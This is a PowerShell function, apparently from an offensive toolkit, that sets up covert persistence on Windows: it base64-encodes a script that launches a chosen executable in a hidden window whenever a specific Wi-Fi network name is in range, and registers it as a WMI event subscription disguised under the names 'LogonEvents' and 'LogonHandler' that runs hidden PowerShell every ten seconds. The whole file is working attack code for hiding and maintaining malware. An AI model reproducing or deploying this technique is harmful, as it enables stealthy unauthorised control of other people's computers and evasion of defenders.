function Invoke-BSSIDPersistence
{
    Param(
        [Parameter(Mandatory=$true)]
        [string]$NetworkName = "V5DS7",

        [Parameter(Mandatory=$true)]
        [string]$EXEPath,

        [string]$FilterName = "NewEventFilter",

        [string]$ConsumerName = "NewConsumer"
        )

    $cmd = @"
    `$NetworkName = `'$NetworkName`'
    `$EXEPath = `'$EXEPath`'
    `$x = (netsh wlan show networks mode=Bssid | Select-String -Pattern "^SSID [0-9]{1,3} : " | % { `$_.ToString().Split(":")[1].trim() }).split("``r``n",[System.StringSplitOptions]::RemoveEmptyEntries)
    `$filename = Split-Path `$EXEPath -Leaf
    if (`$x -contains `$NetworkName) {
        if  (-not ((Get-Process).Path -contains `$EXEPath)) {
            Start-Process `$EXEPath -WindowStyle Hidden
        }
   
    } else {
            Get-Process | where-object { `$_.Path -eq `$EXEPath } | stop-process -force
    }
"@

    $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
    $encodedString = [Convert]::ToBase64String($bytes)
    #[system.text.encoding]::unicode.getstring([system.convert]::FromBase64String($encodedString))

    $filterName = 'LogonEvents'
    $consumerName = 'LogonHandler'
    $Query = "Select * From __InstanceModificationEvent Where TargetInstance Isa 'Win32_LocalTime' And TargetInstance.Second LIKE '%5'"
    $psexe = 'powershell.exe'
    $psargs = "-noprofile -nologo -win hidden -enc $encodedString"
    $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$FilterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop
    $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Argument @{Name=$ConsumerName;ExecutablePath=$psexe;CommandLineTemplate=$psargs}
    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
 
}
